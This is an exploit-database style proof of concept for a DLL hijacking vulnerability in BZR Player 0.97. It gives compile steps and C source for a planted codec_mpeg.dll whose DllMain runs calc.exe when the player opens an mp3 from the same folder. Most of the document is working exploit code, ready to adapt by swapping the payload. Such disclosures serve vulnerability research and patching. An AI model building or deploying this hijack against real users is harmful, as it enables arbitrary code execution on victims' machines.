/* # Exploit Title: BZR Player 0.97 (codec_mpeg.dll) - DLL Hijacking Vulnerability
// # Date: 25.11.2013
// # Exploit Author: Akin Tosunlar
// # Software Link: http://www.softpedia.com/dyn-postdownload.php?p=238598&t=4&i=1
// # Version: 0.97 (Probably old version of software and the LATEST version too)
// # Vendor Homepage: http://bzrplayer.blazer.nu/
// # Tested on: [ Windows XP sp3]
// # Contact : info@vigasis.com
// #------------------
// # Web Page : http://www.vigasis.com
// # 
// #
// #  gcc -shared -o codec_mpeg.dll evil.c
// #  Compile evil.c and rar mp3 file and codec_mpeg.dll same folder. Associate Default Player as BZR Player or OpenWith BZR Player.Double-click Mp3 File. program start Calc.exe immediately.
// #
*/ 


#include <windows.h>

int evilcode()
{
WinExec("calc", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
evilcode();
return 0;
}
